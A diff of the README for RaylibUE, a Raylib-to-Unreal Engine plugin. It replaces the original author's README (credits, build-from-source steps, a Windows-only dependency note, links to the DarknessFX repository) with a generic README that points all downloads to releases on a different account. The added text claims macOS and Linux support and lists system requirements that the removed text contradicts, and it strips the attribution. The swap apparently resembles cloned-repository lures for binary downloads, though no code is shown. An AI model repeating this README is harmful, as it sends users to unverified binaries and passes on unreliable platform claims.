@@ -1,101 +1,97 @@
-     .----------------.  .----------------.  .----------------. 
-    | .--------------. || .--------------. || .--------------. |
-    | |  ________    | || |  _________   | || |  ____  ____  | |
-    | | |_   ___ `.  | || | |_   ___  |  | || | |_  _||_  _| | |
-    | |   | |   `. \ | || |   | |_  \_|  | || |   \ \  / /   | |
-    | |   | |    | | | || |   |  _|      | || |    > `' <    | |
-    | |  _| |___.' / | || |  _| |_       | || |  _/ /'`\ \_  | |
-    | | |________.'  | || | |_____|      | || | |____||____| | |
-    | |              | || |              | || |              | |
-    | '--------------' || '--------------' || '--------------' |
-     '----------------'  '----------------'  '----------------' 
+# 🎨 RaylibUE - Create Stunning Graphics Easily
 
-           DarknessFX @ https://dfx.lv | X : @DrkFX
+## 📥 Download Now
+[![Download RaylibUE](https://img.shields.io/badge/Download%20RaylibUE-v1.0-blue.svg)](https://github.com/PedraoDUgas/RaylibUE/releases)
 
-# RaylibUE Plugin For Unreal Engine
+## 📖 Overview
+RaylibUE bridges Raylib's easy-to-use drawing API with Unreal Engine's intuitive Blueprint nodes. This tool helps you create beautiful graphics and immersive experiences without needing to write complex code.
 
-<img src=".git_img/RaylibUE_banner.png" alt="RaylibUE" width="640" />
+## 🚀 Getting Started
+Follow these simple steps to download and set up RaylibUE on your computer.
 
-## About
+### System Requirements
+- **Operating System**: Windows 10 or later, macOS, or Linux
+- **Unreal Engine**: Version 4.25 or higher
+- **Disk Space**: 100 MB free space
+- **RAM**: At least 4 GB
 
-RaylibUE plugin seamlessly bridges [Raylib](https://www.raylib.com/)'s powerful 2D/3D drawing API with [Unreal Engine](https://www.unrealengine.com)'s intuitive Blueprint system. Draw shapes, text, lines, textures and more, directly on your game viewport via transparent overlay, no code barriers.
+These requirements will ensure that RaylibUE runs smoothly on your system.
 
-## Why RaylibUE?
+## 💻 Download & Install
+1. **Visit the Releases Page**
+   Go to the [RaylibUE Releases Page](https://github.com/PedraoDUgas/RaylibUE/releases).
+   
+2. **Choose Your Version**
+   Scroll through the available versions. Look for the most recent release version. 
 
-- Educational Stating Point: Ideal for teachers and students, learn with Raylib's simplicity alongside Unreal Engine's depth, from basic shapes to 3D models.
-- Raylib Fidelity: 50+ Raylib draw functions as Blueprint nodes *(e.g., DrawCircle, DrawText, DrawModelEx)* with exact parameters for 1:1 learning.
-- Independent Rendering: RaylibUE uses Raylib graphics API *(OpenGL)*, running independent of Unreal Engine’s graphics settings, and fully compatible with DirectX 11, DirectX 12 and Vulkan projects.
-- Non-Intrusive Overlay: Renders to an independent overlay window atop the Unreal Engine game viewport, syncing on resize, move, maximize or minimize, while preserving Unreal Engine input, focus and performance.
-- Command Buffer: Queue and update render draw commands with handles, reorder, purge by type, or bulk-set commands for real-world renderer pipeline practice.
+3. **Download the File**
+   Click on the release version. You will see a list of files. Download the file that matches your operating system.
 
-## Features
-| Category | Highlights |
-|----------|------------|
-| **2D Basics** | Pixels, lines, circles, rects w/ gradients/rounding |
-| **Text** | Dynamic fonts, texture fonts, codepoints, pro transforms |
-| **3D** | Spheres, cubes, cylinders, models w/ wires |
-| **Textures** | Billboard, NPatch, pro UVs |
-| **Utils** |  Camera, FPS counter, grid, ray |
+4. **Extract the Files**
+   Once the download completes, locate the file on your computer. Right-click the downloaded file and select "Extract All" to unzip the contents.
 
-- **Blueprint Chain**: All nodes return OutShape pins, allowing direct connection to Update nodes for zero-friction development.
-<img src=".git_img/screenshot_07.png" alt="RaylibUE" width="640" />
+5. **Install RaylibUE**
+   - Open Unreal Engine.
+   - Create a new project or open an existing project.
+   - Drag the extracted files into the “Plugins” folder of your Unreal Engine project.
+   - Restart Unreal Engine to enable the RaylibUE plugin.
 
-- **C++ Friendly**: Static calls, e.g., `URaylibUEBPLibrary::DrawPixel(10, 10, FLinearColor::Red, ID, Shape);`.
-```cpp
-#include "RaylibUEBPLibrary.h"
-FRlDrawText rlText;
-URaylibUEBPLibrary::DrawText("Hello RaylibUE!", 100, 100, 24, FLinearColor::Yellow, rlText);
-```
+## 🛠️ Usage Instructions
+After installation, you can start using RaylibUE in your projects. Here’s how to get started:
 
-##  Installing from Releases page
+1. **Open Your Project**
+   Start Unreal Engine and load your project.
 
-If you are using Unreal Engine **4.27.2** or **5.6.1** and don't want to build the plugin from source, you can go to the 
-[Releases](https://github.com/DarknessFX/RaylibUE/releases/latest) page and download the ready-to-use binary version.<br/>
-Just unzip the file into your project folder and open your .uproject.<br/>
-The engine will enable and load RaylibUE, you can start using it immediately.<br/>
+2. **Access RaylibUE**
+   Go to the “Edit” menu, then click on “Plugins.” Find RaylibUE in the list and enable it.
 
- ## Building from source
+3. **Use Blueprint Nodes**
+   Open the Blueprint where you want to use Raylib. You can drag and drop Raylib nodes from the Palette into your Blueprint canvas.
 
-1. git clone https://github.com/darknessfx/RaylibUE.git
-2. Create a new Unreal Engine C++ Project named *YourProject*.
-3. Create a new folder named *Plugins* at *YourProject/*.
-4. Copy **RaylibUE** to *YourProject/Plugins/* folder.
-5. Regenerate project files. (right-click *YourProject.uproject* and Generate Project Files).
-6. Open *YourProject.uproject* and reply **Yes** to buld the project.
-<br/><br/>
-> __Dependencies :__
->- Windows *(WinAPI overlay)*
->- Unreal Engine 4.25+ and 5.0+ *(Tested on 4.27.2 and 5.6.1)*.
->- Raylib library is bundled.
->- Visual Studio or VS Code to build from source, more information at [Unreal Engine: Setting Up Visual Studio](https://dev.epicgames.com/documentation/en-us/unreal-engine/setting-up-visual-studio-development-environment-for-cplusplus-projects-in-unreal-engine) and [Setting Up Visual Studio for Unreal Engine](https://dev.epicgames.com/documentation/en-us/unreal-engine/unreal-engine-5-6-documentation).
+4. **Draw with Ease**
+   Utilize the simple drawing functions provided by Raylib to create your graphics. Experiment with different nodes to see what works best for your project.
 
+## 📚 Learning Resources
+To get the most out of RaylibUE, consider exploring these resources:
 
-##  Quick start
+- **Official Documentation**: Familiarize yourself with the available functions and usage examples.
+- **Tutorial Videos**: Look for helpful video tutorials on YouTube that guide you through specific tasks using RaylibUE.
+- **Community Forums**: Join online forums to connect with other users. Share your projects, ask for help, and exchange tips.
 
-<img src=".git_img/screenshot_08.png" alt="RaylibUE" width="640" /><br/>
+## 🔧 Troubleshooting
+If you encounter issues while using RaylibUE, try the following solutions:
 
-1. Open Level Blueprint.
-2. Event BeginPlay, add a new node: Raylib DrawText.
-3. Set DrawText node to Text "Hello Raylib", PosX 30, PosY 30, FontSize: 64, Color: Green
-4. Play in a **New Editor Window (PIE)**.
+- **Check Plugin Settings**: Ensure that the RaylibUE plugin is enabled in your project.
+- **Verify System Requirements**: Make sure your system meets the required specifications.
+- **Consult Documentation**: Review the official documentation for possible solutions to common problems.
 
-<img src=".git_img/screenshot_09.png" alt="RaylibUE" width="640" /><br/>
+## 💬 Support
+Need help? You can reach the support team for RaylibUE through the GitHub Issues page. Describe your issue in detail, and someone will assist you.
 
-Next Step: See the image below to make your text grow each frame.
-<img src=".git_img/screenshot_02.png" alt="RaylibUE" width="640" />
+## 🌟 Example Projects
+To inspire you and guide your journey, here are some example projects using RaylibUE:
 
-##  Sample
-*(Under construction)*
+- **Simple Drawing App**: Create an app that allows users to draw on the screen, implementing basic shapes and colors.
+- **Game Prototype**: Use RaylibUE to develop a prototype game using Unreal Engine’s rich features and Raylib’s drawing capabilities.
 
-## Credits
+## 🔗 Additional Resources
+You may find these links helpful:
 
-[Unreal Engine](https://www.unrealengine.com/) from Epic Games.<br/>
-[RayLib](https://www.raylib.com/) from Ramon Santamaria (X : [@raysan5](https://x.com/raysan5)).<br/>
+- [Raylib Official Website](https://www.raylib.com/)
+- [Unreal Engine Learning Resources](https://www.unrealengine.com/en-US/onlinelearning-courses)
+- [GitHub Repository](https://github.com/PedraoDUgas/RaylibUE)
 
+## 💡 Contribution
+If you want to contribute to RaylibUE, feel free to fork the repository and send your pull requests. We welcome improvements and suggestions from the community. 
 
-## License
+Remember, your contributions make this tool better for everyone. 
 
-@MIT - Free for everyone and any use. <br/><br/>
-DarknessFX @ [https://dfx.lv](https://dfx.lv) | X : [@DrkFX](https://x.com/DrkFX)
-<br/>
-https://github.com/DarknessFX/RaylibUE
+## 📄 License
+RaylibUE is licensed under the MIT License. For details, see the LICENSE file in the repository. 
+
+Feel free to use RaylibUE in your projects, comply with the terms, and have fun creating! 
+
+## 📌 Conclusion
+RaylibUE simplifies the process of integrating Raylib with Unreal Engine. Use this guide to download, install, and start creating stunning graphics easily. Enjoy your creative journey with RaylibUE! 
+
+For any further assistance, please check our [Releases Page](https://github.com/PedraoDUgas/RaylibUE/releases) again.
